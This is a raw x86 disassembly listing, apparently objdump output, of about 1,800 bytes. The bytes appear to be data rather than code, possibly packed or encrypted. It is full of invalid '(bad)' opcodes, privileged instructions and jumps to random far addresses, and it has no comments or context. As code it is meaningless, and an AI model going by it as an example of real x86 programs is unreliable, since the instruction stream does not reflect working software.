  40bba2:	jge    0x40bbe0
  40bba4:	iret   
  40bba5:	daa    
  40bba6:	sti    
  40bba7:	or     BYTE PTR [edx+0x5b],dh
  40bbaa:	adc    edi,DWORD PTR [eax+0x2fa3dda2]
  40bbb0:	jle    0x40bb71
  40bbb2:	xlat   BYTE PTR ds:[ebx]
  40bbb3:	sub    BYTE PTR [esi-0x54],bh
  40bbb6:	fisubr WORD PTR [edx]
  40bbb8:	aad    0x7f
  40bbba:	jg     0x40bb5b
  40bbbc:	loope  0x40bb3f
  40bbbe:	outs   dx,BYTE PTR ds:[esi]
  40bbbf:	fwait
  40bbc0:	pop    ds
  40bbc1:	popa   
  40bbc2:	add    DWORD PTR [edx-0x599f5f78],esi
  40bbc8:	test   ecx,esp
  40bbca:	pop    esp
  40bbcb:	js     0x40bb58
  40bbcd:	in     al,0xdd
  40bbcf:	mov    al,ds:0x295f45ed
  40bbd4:	(bad)  
  40bbd5:	cs cld 
  40bbd7:	inc    ecx
  40bbd8:	mov    ebp,0x78efa11c
  40bbdd:	mov    al,0x51
  40bbdf:	dec    ebx
  40bbe0:	inc    eax
  40bbe1:	cmp    ch,BYTE PTR [ebx+0x6b13ca4b]
  40bbe7:	sbb    al,0x5d
  40bbe9:	wbinvd 
  40bbeb:	and    BYTE PTR [eax+0x29],bh
  40bbee:	das    
  40bbef:	xor    sp,ax
  40bbf2:	aad    0x96
  40bbf4:	push   ebx
  40bbf5:	push   cs
  40bbf6:	dec    ebx
  40bbf7:	enter  0xcd83,0x81
  40bbfb:	inc    esp
  40bbfc:	fadd   st(1),st
  40bbfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbff:	dec    ebx
  40bc00:	bound  edi,QWORD PTR [ebp+0x2597a132]
  40bc06:	sbb    edx,DWORD PTR [eax+ebp*8-0xa2b467a]
  40bc0d:	test   BYTE PTR [ebx-0x10],al
  40bc10:	inc    edi
  40bc11:	jl     0x40bbe6
  40bc13:	jmp    0x9f293e1f
  40bc18:	mov    ds:0x3a9248a1,eax
  40bc1d:	les    edi,FWORD PTR [esi-0x78]
  40bc20:	arpl   WORD PTR [eax+0x3363d024],si
  40bc26:	lea    esp,[edi+eiz*8-0x7a642795]
  40bc2d:	or     al,0xd0
  40bc2f:	mov    dl,BYTE PTR [eax-0x73]
  40bc32:	add    eax,DWORD PTR [edi]
  40bc34:	push   esp
  40bc35:	mov    dh,0x2c
  40bc37:	ja     0x40bc49
  40bc39:	cs loopne 0x40bbeb
  40bc3c:	iret   
  40bc3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc3e:	pushw  ds
  40bc40:	out    0xdf,eax
  40bc42:	clc    
  40bc43:	sub    DWORD PTR [ebp+0x6a70f6e2],ecx
  40bc49:	dec    ebx
  40bc4a:	hlt    
  40bc4b:	shr    BYTE PTR [eax+edx*8+0x3c5c4e50],0x2b
  40bc53:	dec    ecx
  40bc54:	pop    edi
  40bc55:	adc    al,0xae
  40bc57:	xchg   ebx,eax
  40bc58:	jmp    0x50243298
  40bc5d:	retf   
  40bc5e:	stc    
  40bc5f:	adc    al,BYTE PTR ds:0x2265d27e
  40bc65:	lock scas al,BYTE PTR es:[edi]
  40bc67:	and    eax,0xf456241d
  40bc6c:	pop    esp
  40bc6d:	les    edi,FWORD PTR [ebx]
  40bc6f:	cld    
  40bc70:	sub    ch,BYTE PTR [ebp-0x2a]
  40bc73:	cdq    
  40bc74:	mov    ds:0x1bbcc416,al
  40bc79:	and    eax,0x9b5c6aac
  40bc7e:	sbb    DWORD PTR [ebx],0xf0c36f5
  40bc84:	mov    DWORD PTR [edx-0x8],ecx
  40bc87:	or     BYTE PTR [ecx],ah
  40bc89:	dec    edi
  40bc8a:	cli    
  40bc8b:	sbb    DWORD PTR [ecx-0x47195756],0x9b80c03f
  40bc95:	popa   
  40bc96:	lea    ebp,[ebx+esi*4-0x7964c923]
  40bc9d:	retf   0xe90d
  40bca0:	or     ch,BYTE PTR [edi]
  40bca2:	push   cs
  40bca3:	sub    dh,BYTE PTR [ebp-0x16]
  40bca6:	push   es
  40bca7:	jb     0x40bc7f
  40bca9:	retf   
  40bcaa:	mov    cl,0xcf
  40bcac:	xchg   edi,eax
  40bcad:	std    
  40bcae:	mov    al,ds:0xf7608d6d
  40bcb3:	pop    edi
  40bcb4:	push   es
  40bcb5:	addr16 cs or dh,0xf5
  40bcba:	or     DWORD PTR [ebx],ebp
  40bcbc:	arpl   cx,bp
  40bcbe:	jnp    0x40bd3f
  40bcc0:	xor    ah,BYTE PTR [edi+0x3ba35850]
  40bcc6:	and    eax,0x547dabaa
  40bccb:	sahf   
  40bccc:	mov    ?,WORD PTR [ecx-0x15]
  40bccf:	inc    esi
  40bcd0:	sub    ecx,ebp
  40bcd2:	call   0x1c2b89f1
  40bcd7:	mov    WORD PTR [ebx+0x4a492d94],es
  40bcdd:	data16 jbe 0x40bd11
  40bce0:	cli    
  40bce1:	cmp    edx,DWORD PTR [esi]
  40bce3:	cwde   
  40bce4:	aas    
  40bce5:	cli    
  40bce6:	jg     0x40bce0
  40bce8:	mov    edx,0xad4b708
  40bced:	hlt    
  40bcee:	xor    eax,ebx
  40bcf0:	mov    fs,WORD PTR [eax+0x3d]
  40bcf3:	mov    dh,0x4c
  40bcf5:	loope  0x40bc8d
  40bcf7:	(bad)  
  40bcf8:	push   ecx
  40bcf9:	(bad)  
  40bcfa:	mov    cl,0x7a
  40bcfc:	aaa    
  40bcfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcfe:	popf   
  40bcff:	xchg   ecx,eax
  40bd00:	arpl   WORD PTR [ebx],sp
  40bd02:	popf   
  40bd03:	add    ch,BYTE PTR ds:0xb21e94f
  40bd09:	cmp    bl,BYTE PTR [esi-0x65a4f2]
  40bd0f:	pop    ds
  40bd10:	ret    
  40bd11:	inc    edx
  40bd12:	or     ebx,0x44d5b4dc
  40bd18:	xchg   ecx,eax
  40bd19:	cmp    dh,BYTE PTR [ebx]
  40bd1b:	clc    
  40bd1c:	rol    DWORD PTR [esi+esi*2],cl
  40bd1f:	xcrypt-ofb (bad)
  40bd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd21:	lods   eax,DWORD PTR ds:[esi]
  40bd22:	(bad)  
  40bd24:	pusha  
  40bd25:	lods   eax,DWORD PTR ds:[esi]
  40bd26:	stos   DWORD PTR es:[edi],eax
  40bd27:	mov    al,0x4e
  40bd29:	push   esi
  40bd2a:	in     eax,dx
  40bd2b:	xchg   ecx,eax
  40bd2c:	sub    DWORD PTR [ecx],0x269e002b
  40bd32:	mov    ds:0xe76624f8,al
  40bd37:	fisttp DWORD PTR [edi+0x597e75f6]
  40bd3d:	or     eax,0xcce495cb
  40bd42:	loope  0x40bda6
  40bd44:	cmp    eax,0x53fd1d5d
  40bd49:	cmp    ah,ah
  40bd4b:	scas   eax,DWORD PTR es:[edi]
  40bd4c:	shr    BYTE PTR [edi+0x23],cl
  40bd4f:	push   cs
  40bd50:	sbb    BYTE PTR [esi+0x34],ch
  40bd53:	cwde   
  40bd54:	loope  0x40bd38
  40bd56:	in     eax,dx
  40bd57:	enter  0xee5c,0x94
  40bd5b:	dec    edi
  40bd5c:	outs   dx,BYTE PTR ds:[esi]
  40bd5d:	out    dx,eax
  40bd5e:	cdq    
  40bd5f:	inc    esp
  40bd60:	sbb    bh,BYTE PTR ds:[ecx]
  40bd63:	in     eax,dx
  40bd64:	into   
  40bd65:	and    cl,ch
  40bd67:	add    BYTE PTR [ebx],dl
  40bd69:	test   BYTE PTR [eax+edi*1-0x67],0x1f
  40bd6e:	out    0x3f,al
  40bd70:	cmp    al,0x3d
  40bd72:	dec    ebx
  40bd73:	daa    
  40bd74:	into   
  40bd75:	aaa    
  40bd76:	call   0xae30423d
  40bd7b:	inc    esp
  40bd7c:	and    dl,dh
  40bd7e:	jne    0x40bd41
  40bd80:	xchg   esp,eax
  40bd81:	out    dx,eax
  40bd82:	pop    es
  40bd83:	mov    ecx,0x419a8de1
  40bd88:	call   0xe3eab5b2
  40bd8d:	pop    ds
  40bd8e:	mov    ebx,0x74b581be
  40bd93:	push   edx
  40bd94:	test   al,0xd
  40bd96:	xchg   esi,eax
  40bd97:	sub    ebp,0x54
  40bd9a:	fbstp  TBYTE PTR [eax+edx*8+0x32e087e9]
  40bda1:	add    bl,BYTE PTR [eax-0x6a291a9c]
  40bda7:	mov    esi,0x689b88d9
  40bdac:	mov    ebx,0x4b6ac697
  40bdb1:	pop    ds
  40bdb2:	outs   dx,BYTE PTR ds:[esi]
  40bdb3:	test   BYTE PTR [edx+0x6b933ca8],ah
  40bdb9:	jg     0x40bd9e
  40bdbb:	mov    esi,DWORD PTR [ebx-0x9]
  40bdbe:	sbb    DWORD PTR [ebx+0x2c],0x50d3ebc2
  40bdc5:	pop    esi
  40bdc6:	and    BYTE PTR ds:0xcaa4f353,dl
  40bdcc:	retf   0x5f52
  40bdcf:	retf   
  40bdd0:	pop    esp
  40bdd1:	je     0x40bd5c
  40bdd3:	cmc    
  40bdd4:	push   edi
  40bdd5:	sub    BYTE PTR [ebp-0x522d06b5],bh
  40bddb:	in     al,0x74
  40bddd:	outs   dx,DWORD PTR ds:[esi]
  40bdde:	dec    esi
  40bddf:	pop    ecx
  40bde0:	sbb    bh,0x99
  40bde3:	aam    0xbd
  40bde5:	je     0x40bda5
  40bde7:	and    ah,cl
  40bde9:	mov    dh,0xfa
  40bdeb:	cmp    BYTE PTR [edi-0x17],ah
  40bdee:	sub    dl,BYTE PTR [ecx]
  40bdf0:	test   BYTE PTR [ecx+0x71],dh
  40bdf3:	xchg   ebx,eax
  40bdf4:	inc    eax
  40bdf5:	jle    0x40be41
  40bdf7:	dec    edi
  40bdf8:	pushf  
  40bdf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdfa:	sub    BYTE PTR [edx+0x64f7a740],dl
  40be00:	in     al,0x58
  40be02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be03:	or     dl,bl
  40be05:	psadbw mm7,QWORD PTR [ecx]
  40be08:	cwde   
  40be09:	cmc    
  40be0a:	fcom   QWORD PTR [edi+0x47ff2db6]
  40be10:	jne    0x40bdc1
  40be12:	ret    
  40be13:	dec    edi
  40be14:	jo     0x40be80
  40be16:	inc    eax
  40be17:	mov    ds:0x7f0b88ef,al
  40be1c:	jmp    0x40bdcc
  40be1e:	or     BYTE PTR gs:[edi-0x37],dl
  40be22:	and    DWORD PTR [edi+0x5a],0xed87cc29
  40be29:	cmp    al,0x43
  40be2b:	mov    bl,0x7d
  40be2d:	fistp  WORD PTR [esi+0x1b2d6beb]
  40be33:	xchg   esp,eax
  40be34:	pop    edx
  40be35:	jnp    0x40be75
  40be37:	repnz outs dx,DWORD PTR ds:[esi]
  40be39:	getsec 
  40be3b:	inc    esp
  40be3c:	aad    0x2a
  40be3e:	inc    esp
  40be3f:	pop    ebx
  40be40:	cwde   
  40be41:	aas    
  40be42:	sbb    DWORD PTR [edx-0x3a41c3ac],ebx
  40be48:	dec    esp
  40be49:	push   esp
  40be4a:	aam    0x4e
  40be4c:	clc    
  40be4d:	test   eax,0xfe6ee4d2
  40be52:	jg     0x40bed2
  40be54:	push   cs
  40be55:	fnstcw WORD PTR ss:[esi+edi*1-0x3b]
  40be5a:	mov    ah,0x9d
  40be5c:	jo     0x40be6e
  40be5e:	sbb    ebp,DWORD PTR [ecx+0x31a79626]
  40be64:	ret    0xe08a
  40be67:	js     0x40be2b
  40be69:	jl     0x40be0f
  40be6b:	jmp    0xab3b:0xd10024ff
  40be72:	push   ecx
  40be73:	sub    esi,DWORD PTR [ebp+0x19]
  40be76:	jecxz  0x40bebd
  40be78:	sti    
  40be79:	push   ecx
  40be7a:	jle    0x40be2d
  40be7c:	ficomp DWORD PTR [eax+ebp*2-0xfc9b5df]
  40be83:	shr    DWORD PTR [eax+ecx*1+0xb027f5a],cl
  40be8a:	push   eax
  40be8b:	xchg   ecx,eax
  40be8c:	mov    ecx,0x29a27f3e
  40be91:	sub    bl,BYTE PTR [edx+0x6fc4d1a7]
  40be97:	lods   al,BYTE PTR ds:[esi]
  40be98:	mov    al,ds:0xcde047f1
  40be9d:	jmp    0x533c:0x691bd715
  40bea4:	iret   
  40bea5:	and    bl,bh
  40bea7:	in     al,0x1f
  40bea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beaa:	cmp    ah,BYTE PTR [ebp+0x5f]
  40bead:	push   ecx
  40beae:	(bad)  
  40beb0:	jmp    0xc1822d94
  40beb5:	adc    al,0x56
  40beb7:	cmp    bl,BYTE PTR [ebp+edx*1-0x579d0545]
  40bebe:	push   0x8570a176
  40bec3:	lahf   
  40bec4:	add    edx,DWORD PTR [ecx+0x40]
  40bec7:	mov    ecx,0xded2cd33
  40becc:	cmp    DWORD PTR [ebp-0x20dc603d],0x20
  40bed3:	dec    edi
  40bed4:	fucomip st,st(0)
  40bed6:	xchg   edx,eax
  40bed7:	mov    DWORD PTR [edi+ebp*4+0x1029bee0],esp
  40bede:	mov    eax,ds:0x60002627
  40bee3:	adc    al,0x54
  40bee5:	and    al,0x70
  40bee7:	lods   al,BYTE PTR ds:[esi]
  40bee8:	popf   
  40bee9:	int3   
  40beea:	sbb    esi,DWORD PTR [eax]
  40beec:	fld    DWORD PTR [ebp-0xa]
  40beef:	xor    al,0x72
  40bef1:	inc    ecx
  40bef2:	pshufw mm4,QWORD PTR [eax],0xd5
  40bef6:	(bad)  
  40bef7:	mov    dh,0xef
  40bef9:	cmp    BYTE PTR [eax+eiz*1],dl
  40befc:	cmp    eax,0xe91ad299
  40bf01:	repnz dec ebp
  40bf03:	sub    DWORD PTR ds:0x7764780,0x3f
  40bf0a:	inc    ecx
  40bf0b:	or     bl,BYTE PTR [edx]
  40bf0d:	push   0xb3c1d87
  40bf12:	or     eax,0xbae25822
  40bf17:	pop    ds
  40bf18:	cli    
  40bf19:	nop
  40bf1a:	sbb    al,0x18
  40bf1c:	jmp    0xfc0d01ce
  40bf21:	pusha  
  40bf22:	test   eax,0xc437464e
  40bf27:	jmp    0xe4db:0xbe475238
  40bf2e:	mov    dh,0x15
  40bf30:	ret    0xcfd2
  40bf33:	and    BYTE PTR [eax],bl
  40bf35:	mov    ecx,0x7d4bfe9
  40bf3a:	arpl   WORD PTR [esi+0x43],di
  40bf3d:	das    
  40bf3e:	stc    
  40bf3f:	push   esp
  40bf40:	pop    esp
  40bf41:	call   0xdeb3:0x70d39166
  40bf48:	cmc    
  40bf49:	inc    esp
  40bf4a:	sbb    dl,cl
  40bf4c:	and    al,0xd9
  40bf4e:	inc    ebp
  40bf4f:	xchg   edi,eax
  40bf50:	and    eax,0xfb0376e7
  40bf55:	sbb    DWORD PTR [edx-0x1b],ebx
  40bf58:	adc    bl,0xc0
  40bf5b:	out    0xa4,al
  40bf5d:	out    0x22,al
  40bf5f:	xchg   esp,eax
  40bf60:	aaa    
  40bf61:	jge    0x40bee6
  40bf63:	cmp    ebx,0xd268ab3b
  40bf69:	mov    dh,0xae
  40bf6b:	out    dx,eax
  40bf6c:	jge    0x40bf68
  40bf6e:	xor    DWORD PTR [ebp-0x36],ebp
  40bf71:	mov    eax,ds:0xec9dfa70
  40bf76:	stc    
  40bf77:	mov    dl,0x82
  40bf79:	(bad)  
  40bf7a:	sub    al,0x43
  40bf7c:	inc    edx
  40bf7d:	mov    eax,0xf546e0d0
  40bf82:	mov    esi,0x3fdec27a
  40bf87:	xchg   esi,eax
  40bf88:	cmp    DWORD PTR [esi],esi
  40bf8a:	push   edx
  40bf8b:	(bad)  
  40bf8f:	sub    BYTE PTR [ebx+0x639faa3d],dl
  40bf95:	je     0x40bf1a
  40bf97:	xlat   BYTE PTR ds:[ebx]
  40bf98:	pop    edx
  40bf99:	pop    ds
  40bf9a:	fbstp  TBYTE PTR [ecx]
  40bf9c:	add    bh,BYTE PTR [ecx+0x37]
  40bf9f:	pop    edi
  40bfa0:	fld    DWORD PTR [eax-0x8]
  40bfa3:	cmp    ah,BYTE PTR [edx+0x8929e9e]
  40bfa9:	adc    eax,0xaecc226e
  40bfae:	outs   dx,DWORD PTR ds:[esi]
  40bfaf:	out    dx,eax
  40bfb0:	data16 mov ds:0xbc7d1ce5,al
  40bfb6:	ret    0x45f2
  40bfb9:	sbb    BYTE PTR [edi],dl
  40bfbb:	(bad)  
  40bfbc:	repnz pop esi
  40bfbe:	jl     0x40bf55
  40bfc0:	lods   al,BYTE PTR ds:[esi]
  40bfc1:	push   es
  40bfc2:	dec    ecx
  40bfc3:	pop    ebx
  40bfc4:	sub    al,BYTE PTR [esi-0xb113025]
  40bfca:	pop    ss
  40bfcb:	adc    dh,BYTE PTR [ecx-0x48]
  40bfce:	xchg   DWORD PTR [ecx+0x1c845ff2],esp
  40bfd4:	das    
  40bfd5:	test   eax,0xbce32834
  40bfda:	xor    DWORD PTR ds:0xd2161276,eax
  40bfe0:	hlt    
  40bfe1:	fbstp  TBYTE PTR [ebx]
  40bfe3:	pop    eax
  40bfe4:	or     eax,0x9fe39fee
  40bfe9:	rcl    al,1
  40bfeb:	cmp    bl,cl
  40bfed:	adc    dh,bl
  40bfef:	xor    eax,0xbf58f2d6
  40bff4:	mov    edx,0x53e791b5
  40bff9:	add    ecx,esi
  40bffb:	sub    DWORD PTR [edx-0x24378b27],esp
  40c001:	jno    0x40bfc7
  40c003:	addr16 add ah,0x39
  40c007:	fisttp DWORD PTR [edx-0x367af31c]
  40c00d:	sahf   
  40c00e:	add    al,0xfa
  40c010:	fs ffree st(7)
  40c013:	add    al,BYTE PTR [ecx]
  40c015:	cmc    
  40c016:	lods   eax,DWORD PTR ds:[esi]
  40c017:	jno    0x40bffe
  40c019:	lds    eax,FWORD PTR [edx-0x50]
  40c01c:	jle    0x40bfec
  40c01e:	fsubr  DWORD PTR [edx-0x55]
  40c021:	sbb    dh,BYTE PTR [esi+0xb]
  40c024:	call   0x5156:0x860ed56c
  40c02b:	add    al,0xfb
  40c02e:	aaa    
  40c02f:	(bad)  
  40c030:	jbe    0x40bfd2
  40c032:	repz inc edx
  40c034:	ret    
  40c035:	sahf   
  40c036:	push   esp
  40c037:	jmp    0xa81f:0x1db8bda8
  40c03e:	ret    
  40c03f:	(bad)  
  40c040:	scas   al,BYTE PTR es:[edi]
  40c041:	call   0x65f2368f
  40c046:	adc    BYTE PTR [ebp+0x6a94be0d],cl
  40c04c:	push   edx
  40c04d:	sub    DWORD PTR ds:0xbb2c5b22,esp
  40c053:	xchg   ebp,eax
  40c054:	xchg   esp,eax
  40c055:	repnz fnstsw WORD PTR [ecx]
  40c058:	mov    eax,ds:0xd6bd87e5
  40c05d:	scas   eax,DWORD PTR es:[edi]
  40c05e:	je     0x40c0de
  40c060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c061:	cld    
  40c062:	sub    eax,0xf6315c34
  40c067:	jnp    0x40bfff
  40c069:	call   0x2d4cb2aa
  40c06e:	outs   dx,DWORD PTR ds:[esi]
  40c06f:	xor    esp,DWORD PTR [edi+0x7482a763]
  40c075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c076:	dec    ebp
  40c077:	pop    eax
  40c078:	adc    al,0x63
  40c07b:	jb     0x40c0e7
  40c07d:	iret   
  40c07e:	mov    dh,0x5d
  40c080:	ins    DWORD PTR es:[edi],dx
  40c081:	in     eax,0x3a
  40c083:	xchg   ebp,eax
  40c084:	jnp    0x40c07d
  40c086:	lods   eax,DWORD PTR ds:[esi]
  40c087:	and    al,0x5c
  40c089:	add    cl,cl
  40c08b:	mov    BYTE PTR [ecx+0x47fcd3bf],0xba
  40c092:	sbb    eax,0x55c7bf13
  40c097:	lods   eax,DWORD PTR ds:[esi]
  40c098:	pop    ecx
  40c099:	cmp    eax,0xb9c55a32
  40c09e:	icebp  
  40c09f:	and    WORD PTR [ebx],di
  40c0a2:	dec    eax
  40c0a3:	lds    eax,FWORD PTR [ebp+0xbf6d739]
  40c0a9:	or     cl,ch
  40c0ab:	pop    eax
  40c0ac:	xor    DWORD PTR [ecx],ebx
  40c0ae:	das    
  40c0af:	iret   
  40c0b0:	repz sbb eax,0x10ff2cda
  40c0b6:	lods   al,BYTE PTR ds:[esi]
  40c0b7:	jo     0x40c12f
  40c0b9:	dec    edx
  40c0ba:	scas   al,BYTE PTR es:[edi]
  40c0bb:	push   ebx
  40c0bc:	xor    BYTE PTR [edx],bh
  40c0be:	inc    esp
  40c0bf:	repz cmc 
  40c0c1:	xor    BYTE PTR [eax],ah
  40c0c3:	nop
  40c0c4:	retf   
  40c0c5:	mov    ebp,DWORD PTR [ebx+eax*8-0x33]
  40c0c9:	ss cmp eax,0x5cac2619
  40c0cf:	xlat   BYTE PTR ds:[ebx]
  40c0d0:	popa   
  40c0d1:	imul   al
  40c0d3:	fwait
  40c0d4:	xchg   ebx,eax
  40c0d5:	dec    ebp
  40c0d6:	jne    0x40c05c
  40c0d8:	sbb    BYTE PTR [ebx+0x7a],bl
  40c0db:	push   edi
  40c0dc:	xor    esi,ecx
  40c0de:	imul   ebx,DWORD PTR [edx],0x8e964813
  40c0e4:	mov    esp,0x30c1cc
  40c0e9:	fsub   QWORD PTR [edi+edx*2]
  40c0ec:	aaa    
  40c0ed:	push   edx
  40c0ee:	pop    es
  40c0ef:	(bad)
  40c0f3:	mov    bl,0x0
  40c0f5:	mov    ebx,0xb97bf1d7
  40c0fa:	pusha  
  40c0fb:	xchg   BYTE PTR [edi],ah
  40c0fd:	(bad)  
  40c0fe:	out    dx,eax
  40c0ff:	bound  edx,QWORD PTR [ebx+0x6a8025c8]
  40c105:	mov    al,0xbd
  40c107:	mov    ebx,edi
  40c109:	les    ecx,FWORD PTR [eax-0x42]
  40c10c:	loope  0x40c15a
  40c10e:	aad    0xf6
  40c110:	and    eax,0x51ff8616
  40c115:	in     eax,0x6f
  40c117:	push   eax
  40c118:	or     dh,dl
  40c11a:	or     ah,BYTE PTR [esi]
  40c11c:	mov    esi,0x410aeecc
  40c121:	and    ah,BYTE PTR [edi+ecx*4-0x1198f1b0]
  40c128:	ins    DWORD PTR es:[edi],dx
  40c129:	mov    dl,0xb
  40c12b:	sar    ebp,0x7d
  40c12e:	and    al,0xb9
  40c130:	mov    esp,0xe49c7490
  40c135:	inc    esp
  40c136:	and    BYTE PTR [ebp-0x1a],ah
  40c139:	sbb    eax,esi
  40c13b:	lds    ebp,FWORD PTR [ecx+0x28d914f4]
  40c141:	pop    ebx
  40c142:	mov    bl,BYTE PTR [eax-0x15]
  40c145:	xor    BYTE PTR [ecx+0x36610ab4],0x92
  40c14c:	lds    edi,FWORD PTR [ebx+0x5b]
  40c14f:	(bad)  
  40c150:	cmp    al,0xdb
  40c152:	mov    ebx,0x8aa7515f
  40c157:	lahf   
  40c158:	jmp    0xe095:0xe6443f6c
  40c15f:	popa   
  40c160:	dec    edx
  40c161:	ins    BYTE PTR es:[edi],dx
  40c162:	dec    eax
  40c163:	mov    bl,BYTE PTR [ebx]
  40c165:	les    edi,FWORD PTR [ebp+0x3c6c7b14]
  40c16b:	push   ds
  40c16c:	xchg   esi,eax
  40c16d:	call   0x18dd:0x4130700b
  40c174:	outs   dx,DWORD PTR ds:[esi]
  40c175:	pop    ds
  40c176:	lahf   
  40c177:	sub    DWORD PTR [edi],ecx
  40c179:	inc    BYTE PTR [edi]
  40c17b:	and    eax,0x8e3609ee
  40c180:	das    
  40c181:	clc    
  40c182:	and    eax,DWORD PTR [ecx+0x4e]
  40c185:	test   DWORD PTR [esi+0x7074119d],ecx
  40c18b:	xor    DWORD PTR [ebp-0x37],0x3
  40c18f:	mov    bh,0x0
  40c191:	sbb    al,0x12
  40c193:	pop    edx
  40c194:	mov    eax,0xbbb6a37e
  40c199:	shl    BYTE PTR [esi],cl
  40c19b:	sahf   
  40c19c:	into   
  40c19d:	fwait
  40c19e:	in     eax,0x1
  40c1a0:	(bad)  
  40c1a1:	aas    
  40c1a2:	sti    
  40c1a3:	add    BYTE PTR [ecx],dl
  40c1a5:	xchg   edi,eax
  40c1a6:	sbb    BYTE PTR [eax],bl
  40c1a8:	out    0xbc,eax
  40c1aa:	jmp    0x8828df8d
  40c1af:	in     al,dx
  40c1b0:	addr16 jmp 0x40c178
  40c1b3:	shr    BYTE PTR [eax+0x6d2f02f8],0xd2
  40c1ba:	cmp    DWORD PTR [eax],eax
  40c1bc:	mov    cl,BYTE PTR [esi-0x79276474]
  40c1c2:	mov    esp,0xd91714aa
  40c1c7:	fist   WORD PTR [eax]
  40c1c9:	imul   ebx,esp,0xc39244b8
  40c1cf:	mov    ebp,0x57bde46b
  40c1d4:	adc    al,0xa3
  40c1d6:	std    
  40c1d7:	cmp    al,0x45
  40c1d9:	and    eax,esp
  40c1db:	push   es
  40c1dc:	clc    
  40c1dd:	mov    eax,0x50ce1d96
  40c1e2:	xor    dh,BYTE PTR [ebx-0x6d9cb593]
  40c1e8:	push   es
  40c1e9:	addr16 pop ecx
  40c1eb:	dec    eax
  40c1ec:	dec    ecx
  40c1ed:	in     eax,dx
  40c1ee:	test   DWORD PTR [eax-0x9],ebp
  40c1f1:	sbb    DWORD PTR [ebx-0x4d],ebp
  40c1f4:	pop    esp
  40c1f5:	xor    DWORD PTR [esi],esp
  40c1f7:	jae    0x40c24b
  40c1f9:	aas    
  40c1fa:	sub    al,0x7f
  40c1fc:	(bad)  
  40c1fd:	nop
  40c1fe:	inc    edi
  40c1ff:	and    al,0xb5
  40c201:	push   edx
  40c202:	lahf   
  40c203:	jle    0x40c228
  40c205:	mov    ds:0x4134d6ee,al
  40c20a:	fisttp QWORD PTR [ecx+0x6a6e31f3]
  40c210:	dec    edx
  40c211:	mov    eax,0x6de517af
  40c216:	mov    eax,ds:0x80468bf0
  40c21b:	nop
  40c21c:	jmp    0x40c21f
  40c21e:	and    DWORD PTR ds:[esi],0x94bf474e
  40c225:	das    
  40c226:	push   edi
  40c227:	mov    bh,0xf5
  40c229:	inc    edi
  40c22a:	adc    DWORD PTR [ebx-0x2aaa583b],edx
  40c230:	jne    0x40c28b
  40c232:	inc    ecx
  40c233:	sahf   
  40c234:	sti    
  40c235:	loopne 0x40c22b
  40c237:	jge    0x40c20f
  40c239:	jno    0x40c215
  40c23b:	cmp    al,0xbf
  40c23d:	cli    
  40c23e:	xchg   ecx,eax
  40c23f:	out    0x62,al
  40c241:	dec    edx
  40c242:	jb     0x40c219
  40c244:	mov    ah,0x85
  40c246:	and    al,0xf5
  40c248:	call   0x22f15330
  40c24d:	pop    ds
  40c24e:	retf   0x9ee8
  40c251:	jmp    0x80bd:0xf9a106c3
  40c258:	jb     0x40c1ed
  40c25a:	daa    
  40c25b:	rcr    DWORD PTR [edx-0x9724449],0x61
  40c262:	push   0x6823053e
  40c267:	or     ecx,ebx
  40c269:	inc    ebp
  40c26a:	xchg   bl,cl
  40c26c:	arpl   WORD PTR [esp+esi*1-0x2a2d4611],di
  40c273:	std    
  40c274:	ret    
  40c275:	fidiv  DWORD PTR [edi+0x443e026d]
  40c27b:	lods   eax,DWORD PTR ds:[esi]
  40c27c:	xchg   esi,eax
  40c27d:	stos   BYTE PTR es:[edi],al
  40c27e:	pop    esp
  40c27f:	push   es
  40c280:	inc    esp
  40c281:	outs   dx,DWORD PTR ds:[esi]
  40c282:	xchg   esp,eax
  40c283:	adc    al,0xe6
  40c285:	dec    edi
  40c286:	jae    0x40c2dc
  40c288:	jae    0x40c2ab
  40c28a:	int3   
  40c28b:	stos   DWORD PTR es:[edi],eax
  40c28c:	mov    dh,0xd8
  40c28e:	call   0x251f:0xc71d244d
  40c295:	pop    eax
  40c296:	lea    edi,[ebx]
  40c298:	pushf  
  40c299:	cwde   
  40c29a:	or     edx,DWORD PTR [eax+0x25706ec2]
  40c2a0:	lods   al,BYTE PTR ds:[esi]
  40c2a1:	pop    edx
  40c2a2:	(bad)  
  40c2a3:	fistp  QWORD PTR [ebp+0x30]
  40c2a6:	loope  0x40c29a
  40c2a8:	jl     0x40c2ce
  40c2aa:	fdivr  st(6),st
  40c2ac:	or     edi,DWORD PTR [eax-0x5e]
  40c2af:	ins    BYTE PTR es:[edi],dx
  40c2b0:	mov    ch,0xec
  40c2b2:	push   edi
  40c2b3:	adc    dh,dl
  40c2b5:	mov    esi,ebx
  40c2b7:	dec    ecx
  40c2b8:	or     eax,DWORD PTR ds:0x8b5999e6
  40c2be:	std    
  40c2bf:	push   cs
  40c2c0:	pop    edx
  40c2c1:	mov    dh,BYTE PTR [esi+0x62]
  40c2c4:	out    dx,eax
  40c2c5:	ja     0x40c317
  40c2c7:	mov    eax,0x575931a1
  40c2cc:	lods   al,BYTE PTR ds:[esi]
  40c2cd:	clc    
  40c2ce:	inc    edx
  40c2cf:	xchg   ebp,eax
  40c2d0:	pusha  
  40c2d1:	pop    esi
  40c2d2:	int3   
  40c2d3:	int3   
  40c2d4:	scas   eax,DWORD PTR es:[edi]
  40c2d5:	adc    al,0xed
  40c2d7:	jnp    0x40c2be
  40c2d9:	xchg   ebx,eax
  40c2da:	cld    
  40c2db:	and    eax,DWORD PTR fs:[edi]
  40c2de:	(bad)  
  40c2df:	retf   0x1cd3
  40c2e2:	mov    ch,0xdf
  40c2e4:	iret   
  40c2e5:	mov    WORD PTR [ebx],?
  40c2e7:	sahf   
  40c2e8:	rcl    BYTE PTR [ecx],cl
  40c2ea:	pusha  
  40c2eb:	inc    ebp
  40c2ec:	les    eax,FWORD PTR [ebp+0x58867342]
  40c2f2:	inc    ecx
  40c2f3:	outs   dx,BYTE PTR ds:[esi]
  40c2f4:	call   0x49afb5e5
  40c2f9:	and    dh,BYTE PTR [edi+eiz*1-0x4]
